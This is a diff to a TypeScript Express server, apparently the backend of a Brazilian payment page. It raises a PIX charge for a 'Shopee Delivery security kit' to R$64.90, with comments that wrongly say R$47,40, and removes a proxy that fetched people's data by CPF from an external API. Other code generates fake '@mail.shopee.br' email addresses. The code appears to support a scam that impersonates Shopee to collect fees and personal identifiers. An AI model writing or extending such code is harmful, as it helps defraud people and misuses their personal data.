@@ -469,7 +469,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`[GATEWAY] Usando gateway: ${gatewayChoice}`);
       
       // Processar os dados recebidos
-      const { name, cpf, email, phone, amount = 14.90, description = "Kit de Segurança Shopee Delivery" } = req.body;
+      const { name, cpf, email, phone, amount = 64.90, description = "Kit de Segurança Shopee Delivery" } = req.body;
       
       if (!name || !cpf) {
         return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
@@ -1124,8 +1124,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'CPF é obrigatório.' });
       }
       
-      // Valor fixo para o kit de segurança: R$ 14,90
-      const paymentAmount = 14.90;
+      // Valor fixo para o kit de segurança: R$ 47,40
+      const paymentAmount = 64.90;
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1692,8 +1692,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
-      // Valor fixo para o kit de segurança: R$ 14,90
-      const paymentAmount = 14.90;
+      // Valor fixo para o kit de segurança: R$ 47,40
+      const paymentAmount = 64.90;
       
       // Processar pagamento via API For4Payments
       const paymentResult = await paymentService.createPixPayment({
@@ -2348,84 +2348,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         success: false, 
         message: 'Erro interno do servidor' 
       });
-    }
-  });
-  
-  // Endpoint proxy para buscar dados do cliente na API externa (evita CORS)
-  app.get('/api/cliente/cpf/:cpf', async (req, res) => {
-    try {
-      const { cpf } = req.params;
-      
-      if (!cpf) {
-        return res.status(400).json({
-          sucesso: false,
-          message: 'CPF é obrigatório'
-        });
-      }
-      
-      console.log('🔍 Buscando dados do cliente via proxy:', cpf);
-      
-      // Fazer requisição para a API externa com timeout maior e retry
-      const apiUrl = `https://recoverify1.replit.app/api/v1/cliente/cpf/${cpf}`;
-      
-      let lastError: any;
-      const maxRetries = 2; // Tentar 2 vezes
-      
-      for (let attempt = 1; attempt <= maxRetries; attempt++) {
-        let startTime = Date.now();
-        try {
-          console.log(`📡 Tentativa ${attempt} de ${maxRetries} - Iniciando requisição...`);
-          console.log(`📍 URL: ${apiUrl}`);
-          
-          const response = await axios.get(apiUrl, {
-            headers: {
-              'Accept': 'application/json',
-              'Content-Type': 'application/json'
-            },
-            timeout: 30000 // 30 segundos de timeout
-          });
-          
-          const duration = Date.now() - startTime;
-          console.log(`✅ Dados do cliente obtidos com sucesso em ${duration}ms`);
-          console.log(`📊 Status: ${response.status}`);
-          console.log(`📦 Dados:`, JSON.stringify(response.data).substring(0, 200));
-          
-          // Retornar os dados recebidos da API
-          return res.json(response.data);
-        } catch (err: any) {
-          const duration = Date.now() - startTime;
-          lastError = err;
-          console.error(`❌ Tentativa ${attempt} falhou após ${duration}ms`);
-          console.error(`❌ Erro: ${err.message}`);
-          console.error(`❌ Code: ${err.code}`);
-          
-          // Se não for a última tentativa, aguardar antes de tentar novamente
-          if (attempt < maxRetries) {
-            console.log(`⏳ Aguardando 2 segundos antes da próxima tentativa...`);
-            await new Promise(resolve => setTimeout(resolve, 2000)); // Aguardar 2 segundos
-          }
-        }
-      }
-      
-      // Se chegou aqui, todas as tentativas falharam
-      throw lastError;
-    } catch (error: any) {
-      console.error('❌ Erro ao buscar dados do cliente:', error.message);
-      
-      if (error.response) {
-        // A API retornou um erro
-        res.status(error.response.status).json(error.response.data);
-      } else if (error.code === 'ECONNABORTED') {
-        res.status(408).json({ 
-          sucesso: false, 
-          message: 'Tempo esgotado ao buscar dados' 
-        });
-      } else {
-        res.status(500).json({ 
-          sucesso: false, 
-          message: 'Erro ao conectar com a API externa' 
-        });
-      }
     }
   });
   
